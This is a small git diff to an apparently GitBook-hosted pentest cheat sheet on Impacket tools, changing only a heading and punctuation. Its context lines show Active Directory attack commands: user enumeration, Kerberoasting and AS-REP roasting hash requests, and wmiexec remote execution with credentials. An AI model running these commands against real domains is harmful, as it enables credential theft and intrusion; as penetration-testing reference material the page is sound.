@@ -26,7 +26,7 @@ python3 GetADUsers.py -all -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
 ./GetUserSPNs.py -request -dc-ip <DC_IP> Domain.local/Administrator
 ```
 
-### Account witch doesn't require Kerberos Authentication
+#### Account witch doesn't require Kerberos Authentication
 
 ```csharp
 ./GetNPUsers.py -dc-ip 10.110.0.222 -request 'crook.badcorp.local/' -format hashcat
@@ -71,7 +71,7 @@ proxychains ./wmiexec.py  Domain/user:Password@1.2.3.4
 ### kerberos ticket
 
 {% hint style="info" %}
-Kerberos ticket must be injected first
+Kerberos ticket must be injected first.
 {% endhint %}
 
 ```csharp
